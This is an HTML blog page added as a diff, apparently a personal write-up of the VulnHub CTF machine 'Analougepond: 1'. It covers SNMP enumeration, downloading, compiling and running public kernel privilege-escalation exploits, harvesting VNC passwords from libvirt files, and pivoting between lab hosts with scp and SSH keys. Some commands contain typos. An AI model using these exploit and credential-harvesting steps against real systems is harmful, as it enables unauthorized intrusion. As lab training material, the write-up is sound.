@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Walkthrough Analougepond: 1</title>
+
+	<!-- Favicon -->
+	<link rel="shortcut icon" href="../img/favicon.ico" type="image/icon">
+	<link rel="icon" href="../img/favicon.ico" type="image/icon">
+
+	<!-- Bootstrap Core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Theme CSS -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    Menu <i class="fa fa-bars"></i>
+                </button>
+                <a class="navbar-brand" href="../">(´• ω •)</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="../">Home</a>
+                    </li>
+                    <li>
+                        <a href="../about/">About</a>
+                    </li>
+                    <li>
+                        <a href="../contact/">Contact</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header class="intro-header" style="background-image: url('../img/post7/main.jpg')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>Analougepond: 1</h1>
+                        <h2 class="subheading">Difficulty: Intermediate</h2>
+						<span class="meta">Posted by <a href="../about/">Admin</a> on March 16, 2020</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Post Content -->
+    <article>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <p><a href="https://www.vulnhub.com/entry/analougepond-1,185/">CTF link</a></p>
+
+					<p>Good day, today I will Walkthrough Analougepond_1 from knightmare. In order to consider a machine rooted, I need to have the following:</p>
+
+					<li>Troll Flag</li>
+					<li>Flag 1</li>
+					<li>Flag 2</li>
+					<li>Have root everywhere</li>
+					<li>User passwords</li>
+					<li>2 VNC passwords</li>
+
+					<h2 class="section-heading">Scan</h2>
+
+					<p>When nmap finished scanning, I saw an interesting 161 snmp port. Now proceed to enumeration.</p>
+
+					<a href="../img/post7/image1.png">
+                        <img class="img-responsive" src="../img/post7/image1.png" alt="">
+                    </a>
+
+					<pre><code>nmap -sU 192.168.2.100</code></pre>
+
+					<p>With snmp-check, I see that the assumed username is "eric" and "There is a house in New Orleans they call it ..."</p>
+
+					<a href="../img/post7/image2.png">
+                        <img class="img-responsive" src="../img/post7/image2.png" alt="">
+                    </a>
+
+					<p>After googling, I find out that the answer to the question was "therisingsun" and now I have a username and password</p>
+					<pre><code>snmp-check 192.168.2.100</code></pre>
+					<pre><code>eric:therisingsun</code></pre>
+
+				    <a href="../img/post7/image3.png">
+                        <img class="img-responsive" src="../img/post7/image3.png" alt="">
+                    </a>
+
+					<h2 class="section-heading">Troll flag and 1th root</h2>
+
+					<p>In order to get root, I will use exploit for kernel 3.19.0-25-generic.</p>
+
+					<a href="../img/post7/image4.png">
+                        <img class="img-responsive" src="../img/post7/image4.png" alt="">
+                    </a>
+
+					<pre><code>uname -a</code></pre>
+					<pre><code>https://www.exploit-db.com/exploits/39166</code></pre>
+
+
+					<a href="../img/post7/image5.png">
+                        <img class="img-responsive" src="../img/post7/image5.png" alt="">
+                    </a>
+
+					<pre><code>wget https://www.exploit-db.com/raw/39166</pre></code>
+					<pre><code>mv 39166 exp.c</pre></code>
+					<pre><code>gcc exp.c -o exp</pre></code>
+					<pre><code>./exp</pre></code>
+
+					<p>After privilege escalation, I go to the root folder and find the troll flag.</p>
+
+
+					<a href="../img/post7/image6.png">
+                        <img class="img-responsive" src="../img/post7/image6.png" alt="">
+                    </a>
+
+					<h2 class="section-heading">VNC passwords</h2>
+
+					<p>By default, passwords from vnc are stored in the /etc/libvirt folder. In the /quemu folder, I see two xml files in them and there are passwords.</p>
+					<a href="../img/post7/image7.png">
+                        <img class="img-responsive" src="../img/post7/image7.png" alt="">
+                    </a>
+
+					<p>With grep, I find out what passwords are in the files</p>
+
+					<a href="../img/post7/image8.png">
+                        <img class="img-responsive" src="../img/post7/image8.png" alt="">
+                    </a>
+
+
+					<pre><code>barringsbank.xml:memphistennessee</code></pre>
+					<pre><code>puppet.xml:sendyoubacktowalker</code></pre>
+
+					<p>Based on the file names, we can assume that these are hosts, but where can I find them?</p>
+
+					<h2 class="section-heading">Way to the puppet</h2>
+
+					<p>In the file /etc/hosts I found the hosts that called the files with passwords from vnc.
+
+					<a href="../img/post7/image9.png">
+                        <img class="img-responsive" src="../img/post7/image9.png" alt="">
+                    </a>
+
+					<p>When connecting to host 192.168.122.2, I see a message that may help me in getting the user.</p>
+
+					<a href="../img/post7/image10.png">
+                        <img class="img-responsive" src="../img/post7/image10.png" alt="">
+                    </a>
+
+					<p>From the text we understand that the username is "sandieshaw".Turning to google again. The most famous sandieshaw song is Puppet On A String (https://www.youtube.com/watch?v=uQQtKqF30a8). then we remove the spaces, replace the uppercase letters with lowercase and get the password.</p>
+
+					<a href="../img/post7/image11.png">
+                        <img class="img-responsive" src="../img/post7/image11.png" alt="">
+                    </a>
+					<pre><code>sandieshaw:puppetonastring</code></pre>
+
+
+					<h2 class="section-heading">2th root and 1th flag</h2>
+
+					<p>Here we will again apply kernel exploit. This time to kernel version 4.4.0-57-generic.n gcc is not installed on the puppet host, so you will have to compile the exploit on analoguepond and move it using scp.</p>
+
+					<a href="../img/post7/image12.png">
+                        <img class="img-responsive" src="../img/post7/image12.png" alt="">
+                    </a>
+
+					<pre><code>wget https://www.exploit-db.com/raw/43418</code></pre>
+					<pre><code>mv 43418 exp2.c</code></pre>
+					<pre><code>gcc exp2.c -o exp</code></pre>
+					<pre><code>scp exp2 sandieshaw@192.168.122.2:/tmp</code></pre>
+					<pre><code>chmod +x exp2</code></pre>
+					<pre><code>./tmp</code></pre>
+
+					<p>Тow I can start searching for the flag.</p>
+
+					<a href="../img/post7/image13.png">
+                        <img class="img-responsive" src="../img/post7/image13.png" alt="">
+                    </a>
+					<p>In the /root folder I find three files: melvin, jim and flag1.txt.0xff. The flag file is hex but when translating it to ascii i got base64 mirrored, after i mirrored base64 and converted to ascii i got the following</p>
+
+					<pre><code>https://www.youtube.com/watch?v=GfJJk7i0NTk If this doesn't work, watch Wargames from 23 minutes in, you might find a password there or something...</code></pre>
+
+					<p>I also found a hidden folder "I_have_you_now" in the final path of which I found two files: my_world_you_are_persistent_try and nlesson_key.gpg</p>
+
+					<a href="../img/post7/image14.png">
+                        <img class="img-responsive" src="../img/post7/image14.png" alt="">
+                    </a>
+
+					<pre><code>my_world_you_are_persistent_try:joshua</code></pre>
+
+					<p>The nlesson_key file is encrypted using gpg and I need to find the key. Now I understand what the clue was with the mister potato head. After watching the video from the flag, I realized that the key is the word "secret", backdoors are not a SECRETS.</p>
+
+					<pre><code>gpg nlesson_key</code></pre>
+
+					<p>After decrypting the nlesson_key.gpg file, I received the ssh private authorization key. By the name of the file you can guess that the user name is nlesson</p>
+
+					<a href="../img/post7/image15.png">
+                        <img class="img-responsive" src="../img/post7/image15.png" alt="">
+                    </a>
+
+				    <h2 class="section-heading">Way to the barringsbank</h2>
+
+
+					<p>During the connection using the authorization key, I entered passsphrase from the my_world_you_are_persistent_try "joshua" file and connected to the nlesson user</p>
+
+					<a href="../img/post7/image16.png">
+                        <img class="img-responsive" src="../img/post7/image16.png" alt="">
+                    </a>
+
+					<h2 class="section-heading">3th root and 2th flag</h2>
+
+					<p>Exploit from the second host is suitable for rooting the last host since the kernel version is the same for them, so again we turn to scp.</p>
+
+					<p>In order to start the exploit I download it on the host 192.168.2.101 then using scp I send the compiled exploit to the host 192.168.122.2 and then to the host 192.168.122.3</p>
+
+					<a href="../img/post7/image17.png">
+                        <img class="img-responsive" src="../img/post7/image17.png" alt="">
+                    </a>
+
+					<pre><code>wget https://www.exploit-db.com/exploits/43418</pre></code>
+					<pre><code>mv 43418 2exp.c</pre></code>
+					<pre><code>gcc 2exp.c -o 2exp</pre></code>
+					<pre><code>scp 2exp sandieshaw@192.168.122.2:/tmp</pre></code>
+					<pre><code>scp -i /root/.ssh/nleeson_key expoit nlesson@192.168.122.3:/home/nleeson/</pre></code>
+					<pre><code>cd /tmp</pre></code>
+					<pre><code>./exp2</pre></code>
+
+					<p>In the root user directory, I did not find anything other than the "me.jpeg" picture and after about fifteen minutes I realized that the flag is in the picture. In order to get it from there I will use steghide. I will resort to scp again to deliver the picture to my kali or you can convert it to base64 then copy, transfer to another file in kali and convert file to the the picture.</p>
+
+					<a href="../img/post7/image18.png">
+                        <img class="img-responsive" src="../img/post7/image18.png" alt="">
+                    </a>
+
+					<p>passphrase will be the name of the file that I constantly found in users' directories "reticulatingsplines"</p>
+					<pre><code>reticulatingsplines</code></pre>
+
+					<p>And this is hex again. in order to decrypt the file I translate hex to ascii and get mirrored base64 then I mirror base64 convert it to a file and decrypt to ascii</p>
+
+					<a href="../img/post7/image19.png">
+                        <img class="img-responsive" src="../img/post7/image19.png" alt="">
+                    </a>
+					<p>that's all, thanks <a href="https://www.vulnhub.com/author/knightmare,245/">knightmare</a> it was a very interesting and fascinating machine</p>
+			   </div>
+            </div>
+        </div>
+    </article>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="https://twitter.com/laf3r_" title="I'm on Twitter">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Copyright &copy; laf3r.github.io 2019-2022</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="../vendor/jquery/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Contact Form JavaScript -->
+    <script src="../js/jqBootstrapValidation.js"></script>
+    <script src="../js/contact_me.js"></script>
+
+    <!-- Theme JavaScript -->
+    <script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
